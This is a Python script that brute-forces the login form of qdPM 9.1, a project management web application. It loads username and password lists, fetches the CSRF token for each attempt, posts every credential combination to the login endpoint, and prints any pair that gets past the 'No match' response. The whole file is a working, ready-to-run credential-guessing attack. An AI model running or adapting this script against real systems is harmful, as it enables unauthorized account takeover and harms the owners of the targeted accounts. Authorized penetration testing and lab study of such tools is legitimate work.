#!/usr/bin/python3
# Bruteforce script for qdPM 9.1 developed by eMVee

import requests, signal, sys, time, re
from argparse import ArgumentParser

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def banner():
    poweredby ='''
        ____             __       ____                                       ______  __  _______   ___
       / __ )_______  __/ /____  / __/___  _____________  _____   ____ _____/ / __ \/  |/  / __ \ <  /
      / __  / ___/ / / / __/ _ \/ /_/ __ \/ ___/ ___/ _ \/ ___/  / __ `/ __  / /_/ / /|_/ / /_/ / / / 
     / /_/ / /  / /_/ / /_/  __/ __/ /_/ / /  / /__/  __/ /     / /_/ / /_/ / ____/ /  / /\__, / / /  
    /_____/_/   \__,_/\__/\___/_/  \____/_/   \___/\___/_/      \__, /\__,_/_/   /_/  /_//____(_)_/   
                                                                  /_/                                       
                      __  ____   __       
                  ___|  \/  \ \ / /__ ___ 
                 / -_) |\/| |\ V / -_) -_)
    Powered by:  \___|_|  |_| \_/\___\___|
                          
    '''
    print(poweredby)

def main(hostname, usernames,passwords):
    URL = hostname + '/index.php/login'
    usernames_file = usernames
    passwords_file = passwords
    session = requests.session()
    number_of_passwords = 0
    number_of_usernames = 0

    #Open a file containing a list of passwords
    with open(passwords_file, 'r') as file:
        content = file.read()
        passwords = content.split()
        for i in passwords:
            if i:
                number_of_passwords += 1
    #Open a file containing a list of usernames
    with open(usernames_file, 'r') as file:
        content = file.read()
        usernames = content.split()
        for i in usernames:
            if i:
                number_of_usernames += 1
    print("Number of passwords loaded: ", number_of_passwords)
    print("Number of usernames loaded: ", number_of_usernames)
    print("Number of attempts to brute force: ", number_of_usernames * number_of_passwords, "\n")

    #Loop to  brute force username with passwords
    for username in usernames:
        for password in passwords:
            s = requests.session()
            r = s.get(URL)
            token = re.findall(r'_csrf_token]" value="(.*?)"', r.text)[0]
            data_post = {
                'login[_csrf_token]': token,
                'login[email]': username,
                'login[password]': password,
                'http_referer': URL
            }
            r = s.post(URL, data=data_post)
            if "No match" not in r.text:
                print("Found some credentials!")
                print("The username is: %s" % username)
                print("The password is: %s" % password)
                print("\n")
            
    print('Finished!')

if __name__ == ("__main__"):
    parser = ArgumentParser(description='BruteForcer - qdmp 9.1')
    parser.add_argument('-url', '--host', dest='hostname', help='Project URL (the full url to the login page)')
    parser.add_argument('-u', '--email', dest='usernames', help='List of possible usernames (email addresses)')
    parser.add_argument('-p', '--password', dest='passwords', help='List of possible passwords')
    args = parser.parse_args()
    banner()
    # Check for arguments
    if  (len(sys.argv) > 1 and isinstance(args.hostname, str) and isinstance(args.usernames, str) and isinstance(args.passwords, str)):
            main(args.hostname, args.usernames, args.passwords)
    else:
        parser.print_help()